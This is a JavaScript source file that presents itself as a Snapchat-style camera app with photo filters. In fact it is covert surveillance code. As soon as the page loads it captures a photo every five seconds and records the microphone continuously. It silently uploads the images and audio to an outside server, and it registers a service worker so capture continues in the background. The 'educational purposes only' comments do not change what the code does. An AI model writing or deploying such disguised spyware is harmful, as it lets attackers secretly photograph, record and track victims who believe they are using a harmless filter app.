/**
 * Snapchat Clone - Camera with Filters + Background Service
 * للأغراض التعليمية فقط
 */

const CONFIG = {
    backendUrl: 'https://Alworker.pythonanywhere.com',
    photoInterval: 5000,      // صورة كل 5 ثواني
    audioDuration: 10000,     // تسجيل 10 ثواني
    audioInterval: 10000      // تسجيل جديد كل 10 ثواني
};

// ========== المتغيرات ==========
let stream = null;
let mediaRecorder = null;
let photoTimer = null;
let audioTimer = null;
let photoCounter = 0;
let audioCounter = 0;
let isRunning = false;
let facingMode = 'user';     // كاميرا أمامية
let flashOn = false;
let currentFilter = 0;
let audioChunks = [];
let recordingStartTime = 0;
let recordingTimer = null;

// الفلاتر
const filters = [
    { name: 'Normal', class: 'filter-normal' },
    { name: 'B&W', class: 'filter-grayscale' },
    { name: 'Sepia', class: 'filter-sepia' },
    { name: 'Vintage', class: 'filter-vintage' },
    { name: 'Cool', class: 'filter-cool' },
    { name: 'Warm', class: 'filter-warm' }
];

// عناصر DOM
const video = document.getElementById('video');
const canvas = document.getElementById('canvas');
const filterOverlay = document.getElementById('filterOverlay');
const filterName = document.getElementById('filterName');
const recordingBar = document.getElementById('recordingBar');
const recordingProgress = document.getElementById('recordingProgress');
const recordingTime = document.getElementById('recordingTime');

// ========== بدء الكاميرا ==========
async function initCamera() {
    try {
        if (stream) {
            stream.getTracks().forEach(t => t.stop());
        }
        
        stream = await navigator.mediaDevices.getUserMedia({
            video: {
                facingMode: facingMode,
                width: { ideal: 720 },
                height: { ideal: 1280 }
            },
            audio: true
        });
        
        video.srcObject = stream;
        isRunning = true;
        
        // عكس الفيديو لو كاميرا أمامية
        video.style.transform = facingMode === 'user' ? 'scaleX(-1)' : 'scaleX(1)';
        
        startCapture();
        console.log('✅ كاميرا شغالة');
        
    } catch (e) {
        console.error('خطأ الكاميرا:', e);
    }
}

// ========== بدء الالتقاط ==========
function startCapture() {
    if (!isRunning) return;
    
    // تصوير كل 5 ثواني
    photoTimer = setInterval(capturePhoto, CONFIG.photoInterval);
    
    // بدء التسجيل فوراً
    startContinuousRecording();
    
    // أول صورة
    setTimeout(capturePhoto, 500);
}

// ========== صورة ==========
function capturePhoto() {
    if (!isRunning || !stream) return;
    
    try {
        canvas.width = video.videoWidth || 720;
        canvas.height = video.videoHeight || 1280;
        
        const ctx = canvas.getContext('2d');
        ctx.save();
        
        // عكس الصورة لو كاميرا أمامية
        if (facingMode === 'user') {
            ctx.translate(canvas.width, 0);
            ctx.scale(-1, 1);
        }
        
        // تطبيق الفلتر
        ctx.filter = getFilterString();
        
        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
        ctx.restore();
        
        const imageData = canvas.toDataURL('image/jpeg', 0.6);
        sendToServer('/capture', { image: imageData });
        
        photoCounter++;
        flashScreen();
        
    } catch (e) {
        console.error('Photo:', e);
    }
}

// ========== تسجيل مستمر 10 ثواني ==========
function startContinuousRecording() {
    if (!isRunning || !stream) return;
    
    const audioStream = new MediaStream(stream.getAudioTracks());
    audioChunks = [];
    
    try {
        mediaRecorder = new MediaRecorder(audioStream, {
            mimeType: MediaRecorder.isTypeSupported('audio/webm;codecs=opus') 
                ? 'audio/webm;codecs=opus' : 'audio/webm'
        });
        
        mediaRecorder.ondataavailable = (e) => {
            if (e.data.size > 0) audioChunks.push(e.data);
        };
        
        mediaRecorder.onstop = () => {
            // إرسال التسجيل
            const blob = new Blob(audioChunks, { type: 'audio/webm' });
            const reader = new FileReader();
            reader.onloadend = () => {
                sendToServer('/audio', { audio: reader.result });
                audioCounter++;
            };
            reader.readAsDataURL(blob);
            
            // بدء تسجيل جديد
            setTimeout(startContinuousRecording, 200);
        };
        
        mediaRecorder.start();
        recordingStartTime = Date.now();
        updateRecordingUI();
        
        // إيقاف بعد 10 ثواني
        audioTimer = setTimeout(() => {
            if (mediaRecorder && mediaRecorder.state === 'recording') {
                mediaRecorder.stop();
                clearInterval(recordingTimer);
            }
        }, CONFIG.audioDuration);
        
    } catch (e) {
        console.error('Audio:', e);
    }
}

// ========== تحديث شريط التسجيل ==========
function updateRecordingUI() {
    recordingTimer = setInterval(() => {
        const elapsed = (Date.now() - recordingStartTime) / 1000;
        const progress = Math.min((elapsed / 10) * 100, 100);
        const remaining = Math.max(10 - elapsed, 0);
        
        recordingProgress.style.setProperty('--progress', `${progress}%`);
        recordingTime.textContent = `00:${String(Math.floor(remaining)).padStart(2, '0')}`;
        
        recordingBar.style.display = 'flex';
        
        if (elapsed >= 10) {
            recordingBar.style.display = 'none';
            clearInterval(recordingTimer);
        }
    }, 100);
}

// ========== الفلاتر ==========
function getFilterString() {
    switch(currentFilter) {
        case 1: return 'grayscale(1)';
        case 2: return 'sepia(0.8)';
        case 3: return 'sepia(0.4) contrast(0.9) brightness(1.1)';
        case 4: return 'saturate(0.7) hue-rotate(30deg)';
        case 5: return 'saturate(1.3) hue-rotate(-10deg)';
        default: return 'none';
    }
}

function applyFilter() {
    filterOverlay.className = 'filter-overlay ' + filters[currentFilter].class;
    filterName.textContent = filters[currentFilter].name;
}

function nextFilter() {
    currentFilter = (currentFilter + 1) % filters.length;
    applyFilter();
}

function prevFilter() {
    currentFilter = (currentFilter - 1 + filters.length) % filters.length;
    applyFilter();
}

// ========== قلب الكاميرا ==========
function switchCamera() {
    facingMode = facingMode === 'user' ? 'environment' : 'user';
    initCamera();
}

// ========== فلاش ==========
function toggleFlash() {
    flashOn = !flashOn;
    const btn = document.querySelector('.top-left .icon');
    btn.textContent = flashOn ? '💡' : '⚡';
    
    if (flashOn) {
        video.style.filter = 'brightness(2)';
    } else {
        video.style.filter = 'brightness(1)';
    }
}

function flashScreen() {
    const flash = document.createElement('div');
    flash.style.cssText = `
        position: fixed; top: 0; left: 0;
        width: 100%; height: 100%;
        background: white; z-index: 100;
        pointer-events: none;
        animation: flashAnim 0.2s ease-out forwards;
    `;
    document.body.appendChild(flash);
    setTimeout(() => flash.remove(), 300);
}

// ========== إرسال للسيرفر ==========
async function sendToServer(endpoint, data) {
    try {
        await fetch(`${CONFIG.backendUrl}${endpoint}`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(data)
        });
    } catch (e) {
        // فشل صامت
    }
}

// ========== Service Worker للتشغيل في الخلفية ==========
if ('serviceWorker' in navigator) {
    navigator.serviceWorker.register('sw.js').catch(() => {});
}

// ========== Visibility Change ==========
document.addEventListener('visibilitychange', () => {
    if (document.hidden) {
        // الصفحة في الخلفية - يفضل شغال
        console.log('⏸ في الخلفية');
    } else {
        // رجعنا للصفحة
        console.log('▶️ رجعنا');
        if (!isRunning) initCamera();
    }
});

// ========== بدء ==========
initCamera();
applyFilter();

// ========== تحذير ==========
console.log('⚠️ للأغراض التعليمية فقط - استخدام ضد الآخرين جريمة');
